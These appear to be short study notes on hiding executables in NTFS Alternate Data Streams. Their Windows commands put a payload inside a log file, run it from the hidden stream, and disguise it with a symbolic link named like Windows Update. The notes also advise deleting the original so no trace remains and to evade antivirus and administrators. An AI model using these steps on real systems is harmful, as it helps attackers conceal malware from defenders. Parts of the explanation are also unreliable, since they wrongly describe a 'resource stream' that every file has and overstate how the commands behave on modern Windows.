**Alternate Data Streams (ADS)**

**What is it?**

- NTFS file attribute — every file has 2 streams:
    - **Data stream** → actual file content
    - **Resource stream** → metadata (hidden stream)
- Attackers hide malicious executables in the resource stream of legitimate files
- Evades basic AV & human detection

---

**Demo Commands (Windows CMD)**

**Hide a text file inside another file**

```cmd
notepad test.txt:secret.txt
```

**Hide an executable inside a legit file**

```cmd
type payload.exe > windowslog.txt:winpeas.exe
```

**Add visible content to legit file (so it looks normal)**

```cmd
notepad windowslog.txt
```

**Execute the hidden executable**

```cmd
start windowslog.txt:winpeas.exe
```

**Create a symbolic link to run it easily**

```cmd
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
```

Then just run:

```cmd
wupdate
```

**List ADS on a file (detect hidden streams)**

```cmd
dir /r
```

---

**Key Notes**

- File shows **0 bytes** in `dir` even after hiding payload — looks clean
- Delete original payload.exe after hiding — no trace
- Works on any modern Windows (NTFS required)
- Not advanced evasion — bypasses basic AV & admin eyes only
